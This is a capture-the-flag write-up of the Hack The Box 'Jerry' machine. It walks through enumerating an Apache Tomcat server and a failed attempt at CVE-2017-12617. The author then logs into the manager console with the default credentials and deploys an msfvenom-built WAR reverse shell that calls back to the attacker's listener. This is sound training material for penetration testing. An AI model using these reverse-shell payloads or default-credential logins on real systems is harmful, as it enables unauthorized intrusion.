---
layout: post
layout: default
title: "Jerry"
description: "My writeup for the HacktheBox Jerry Machine, an easy box that involves uploading a malicious WAR file to a badly secured Tomcat server."
category_string: "Hack the Box (HTB)"
custom_css: ['blogs']
date: 2021-05-04 11:00:00
---

# Contents
- [Overview](#overview)
  - [Ratings](#ratings)
- [Tags](#tags)
- [Enumeration](#enumeration)
    - [All Ports Scan](#all-ports-scan)
    - [Vuln Scan](#vuln-scan)
  - [Gobuster](#gobuster)
  - [Enumerating OS](#enumerating-os)
- [Tomcat](#tomcat)
  - [Webpage](#webpage)
    - [Shell Page](#shell-page)
  - [Tomcat Version](#tomcat-version)
  - [Trying CVE-2017-12617 Exploit](#trying-cve-2017-12617-exploit)
    - [Running the Exploit](#running-the-exploit)
  - [Alternate Exploit](#alternate-exploit)
  - [Manager Console](#manager-console)
    - [WAR File Shell](#war-file-shell)

# Overview

This is the fourth box in my OSCP prep series.

**Box Details**

|IP|User-Rated Difficulty|OS|Date Started|Date Completed|
|---|---|---|---|---|
|10.10.10.95|2.9|Windows|2021-05-04|2021-05-04|

---

This box was pretty easy. It involved logging into a Tomcat Manager page and uploading a `.WAR` shell, which gave us `system` access.

It took me about two hours, which is pretty slow compared to the six minutes for first blood. However, that was mostly because I spent a fair amount of time down a rabbit hole trying to exploit a CVE. When I found the correct path through the management console, it took me about half an hour; the exploit itself dropped me in directly as `system`.

## Ratings

I rated both user and root a 1 for difficulty. The exploit was arguably even simpler than Blue and Legacy, at least by hand - while it wasn't a case of just firing off a metasploit module, uploading a shell and triggering it by simply visiting the URL is much simpler than manually editing an exploit. There was also no privesc involved.

# Tags

#writeup #oscp-prep #windows #file-upload #tomcat #no-metasploit

# Enumeration

I started out with an `nmap`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB]
└─$ mkdir jerry && cd jerry && mkdir nmap
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ nmap -sC -sV -oA nmap/ 10.10.10.95
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 12:35 BST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 4.09 seconds
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ nmap -v -sC -sV -Pn -oA nmap/ 10.10.10.95
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 12:35 BST
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 12:35
Completed NSE at 12:35, 0.00s elapsed
Initiating NSE at 12:35
Completed NSE at 12:35, 0.00s elapsed
Initiating NSE at 12:35
Completed NSE at 12:35, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:35
Completed Parallel DNS resolution of 1 host. at 12:35, 0.01s elapsed
Initiating Connect Scan at 12:35
Scanning 10.10.10.95 [1000 ports]
Discovered open port 8080/tcp on 10.10.10.95
Completed Connect Scan at 12:35, 7.38s elapsed (1000 total ports)
Initiating Service scan at 12:35
Scanning 1 service on 10.10.10.95
Completed Service scan at 12:35, 6.23s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.95.
Initiating NSE at 12:35
Completed NSE at 12:35, 0.81s elapsed
Initiating NSE at 12:35
Completed NSE at 12:35, 0.10s elapsed
Initiating NSE at 12:35
Completed NSE at 12:35, 0.00s elapsed
Nmap scan report for 10.10.10.95
Host is up (0.028s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88

NSE: Script Post-scanning.
Initiating NSE at 12:35
Completed NSE at 12:35, 0.00s elapsed
Initiating NSE at 12:35
Completed NSE at 12:35, 0.00s elapsed
Initiating NSE at 12:35
Completed NSE at 12:35, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.41 seconds
```

This shows just one port open, an Apache Tomcat server on port 8080. It is running version 7.0.88.

### All Ports Scan

This time I checked whether the `-Pn` flag was needed before setting off my all ports scan. It is shown below:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ sleep 300; nmap -Pn -p- -oA nmap/all-ports 10.10.10.95
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 12:41 BST
Nmap scan report for 10.10.10.95
Host is up (0.023s latency).
Not shown: 65534 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 109.57 seconds
```

It found no extra ports.

### Vuln Scan

I ran a vuln scan on the 8080 port:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ nmap --script vuln -Pn -p 8080 -oA nmap/vuln 10.10.10.95
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 12:38 BST
Nmap scan report for 10.10.10.95
Host is up (0.021s latency).

PORT     STATE SERVICE
8080/tcp open  http-proxy
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|_  /docs/: Potentially interesting folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/

Nmap done: 1 IP address (1 host up) scanned in 97.73 seconds
```

This shows it is vulnerable to slow loris, but we are not trying to crash the box, so this is unlikely to be useful.

## Gobuster

`nmap`'s vuln scan did find some default files, so I decided to set off a `gobuster` scan while I poked at the Tomcat version.

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ gobuster dir -u http://10.10.10.95:8080 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.95:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/04 12:44:29 Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
/.                    (Status: 200) [Size: 11398]            
/examples             (Status: 302) [Size: 0] [--> /examples/]
/shell                (Status: 302) [Size: 0] [--> /shell/]   
/con                  (Status: 200) [Size: 0]                 
                                                              
===============================================================
2021/05/04 12:46:13 Finished
===============================================================
```

This came back with a few interesting results, including a `shell` directory.

## Enumerating OS

This came later in the box, when I realised I was unsure about the box's Operating System.

We can look at the OS with a simple `ping`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ ping 10.10.10.95
PING 10.10.10.95 (10.10.10.95) 56(84) bytes of data.
64 bytes from 10.10.10.95: icmp_seq=1 ttl=127 time=41.0 ms
64 bytes from 10.10.10.95: icmp_seq=2 ttl=127 time=20.8 ms
64 bytes from 10.10.10.95: icmp_seq=3 ttl=127 time=21.2 ms
^C
--- 10.10.10.95 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2002ms
rtt min/avg/max/mdev = 20.803/27.659/41.006/9.438 ms
```

Inspecting the TTL tells us a bit about the OS. The default windows TTL is 128, and `ping` decrements by 1, so this is likely a windows box. For Linux, it is usually 64.

We can also run an nmap OS discovery to check this - the scan requires root privileges:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ sudo nmap -O -Pn -oA nmap/os 10.10.10.95
[sudo] password for mac: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-04 13:00 BST
Nmap scan report for 10.10.10.95
Host is up (0.026s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.51 seconds
```

I don't often use the `-O` flag, as when there are more ports than just 8080 open it is often easier to tell what the OS is.

# Tomcat

## Webpage

The website, on `http://10.10.10.95:8080`, is just the default page for Apache Tomcat:

![](/assets/images/blogs/Pasted image 20210504124212.png)

### Shell Page

Navigating to `http://10.10.10.95/shell/` returns a blank white page:

![](/assets/images/blogs/Pasted image 20210504131221.png)

There is nothing in the source:

![](/assets/images/blogs/Pasted image 20210504131242.png)

## Tomcat Version

The version number is exposed both in the `nmap` scan and on the page itself. Let's search Exploit DB:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ searchsploit tomcat 7.0
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                         |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Apache Tomcat 7.0.4 - 'sort' / 'orderBy' Cross-Site Scripting                                                                                                          | linux/remote/35011.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (1)                                                           | windows/webapps/42953.txt
Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote Code Execution (2)                                                           | jsp/webapps/42966.py
----------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We might be able to upload a JSP shell.

## Trying CVE-2017-12617 Exploit

Looking at the exploit with `searchsploit -x jsp/webapps/42966.py`, it seems to reference CVE-2017-12617, which it uses to upload a webshell:

![](/assets/images/blogs/Pasted image 20210504124851.png)

The code seems to generate a JSP payload and upload it directly to the box, using the following two methods:

![](/assets/images/blogs/Pasted image 20210504124931.png)

### Running the Exploit

I initially thought that we had to generate our own shellcode in JSP to point back to our box, and that the exploit just uploads the file. However, it turns out the program actually generates a shell. The `pwn` parameter seems to be just a filename.

Nevertheless, I will quickly go over what I did to generate a `.jsp` shell payload:
- I ran some quick [OS Enumeration](#enumerating-os) to check the operating system, as i wasn't sure at this point (we can cheat and look at the box info on htb, but that's no fun)
- Created a payload with `msfvenom --f jsp -p windows/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -o shell.jsp`
- Started a [netcat](#netcat) listener and tried running the exploit with `python2 42966.py -u http://10.10.10.95:8080 -p shell.jsp`

Now I knew this wasn't necessary, I changed my syntax, just providing the name `shell`. However, running it again with these options just gave me a 404 `resource is not available` error:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ python2 42966.py -u http://10.10.10.95:8080 -p shell



   _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
  / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
 | |     \ \  / /| |__ ______ ) | | | || |   / /_____| |  ) / /_ | |   / / 
 | |      \ \/ / |  __|______/ /| | | || |  / /______| | / / '_ \| |  / /  
 | |____   \  /  | |____    / /_| |_| || | / /       | |/ /| (_) | | / /   
  \_____|   \/   |______|  |____|\___/ |_|/_/        |_|____\___/|_|/_/    
                                                                           
                                                                           

[@intx0x80]


Uploading Webshell .....
$ id

Apache Tomcat/7.0.88 - Error report

 
HTTP Status 404 - /shell.jsp

type
 Status report
message
 
/shell.jsp

description
 
The requested resource is not available.

Apache Tomcat/7.0.88
```

I also tried navigating to it in browser at `http://10.10.10.95/shell.jsp`, and even tried `http://10.10.10.95/shell/shell.jsp` in case it went to that directory - but both of these also gave me a 404.

Looking at the [CVE details](https://access.redhat.com/security/cve/cve-2017-12617), the resource needs to not be in readonly mode, and allow `PUT` requests:

![](/assets/images/blogs/Pasted image 20210504132129.png)

This also states that it only affects Linux machines. So we may be barking up the wrong tree.

## Alternate Exploit

The other option, `windows/webapps/42953.txt`, seems to be tailored to windows. Running `searchsploit -x windows/webapps/42953.txt` gives an overview of the request structure needed.

![](/assets/images/blogs/Pasted image 20210504132312.png)

I pasted this directly into Burp Repeater, and just had to configure the host:

![](/assets/images/blogs/Pasted image 20210504133101.png)

My first attempt gave me a blank response, so I made sure to change the referer header to match the current IP just in case, and sent again:

![](/assets/images/blogs/Pasted image 20210504133324.png)

The response was also blank, so I just went and checked if the shell had been uploaded. However, `http://10.10.10.95/1.jsp` also gave me a 404.

## Manager Console

I decided to change my strategy and look at something else. I went back to the main site, and navigated to the manager app.

Here I was prompted for some credentials. I tried the default login for Tomcat, `tomcat`:`s3cret`:

![](/assets/images/blogs/Pasted image 20210504133752.png)

I was in!

### WAR File Shell

Now the next step was to use this to upload a shell. Scrolling down there was an option to deploy a WAR file:

![](/assets/images/blogs/Pasted image 20210504133840.png)

I did a quick check in `/usr/share/webshells` to see if there was a folder for `WAR` files, but there wasn't - so I went to `msfvenom` instead:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/jerry]
└─$ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.13 lport=9001 -f war -o warshell.war
Payload size: 13400 bytes
Final size of war file: 13400 bytes
Saved as: warshell.war
```

I found a good guide when searching "kali war shell" that took me through this process: [https://www.ethicaltechsupport.com/blog-post/apache-tomcat-war-backdoor/](https://www.ethicaltechsupport.com/blog-post/apache-tomcat-war-backdoor/)

I then selected the file on my box and clicked deploy:

![](/assets/images/blogs/Pasted image 20210504135209.png)

We can then visit `http://10.10.10.95/warshell`:

![](/assets/images/blogs/Pasted image 20210504135400.png)

Which spawns a shell:

![](/assets/images/blogs/Pasted image 20210504142751.png)

And we can grab both flags:

![](/assets/images/blogs/Pasted image 20210504143146.png)

That's the box!

![](/assets/images/blogs/Pasted image 20210504145745.png)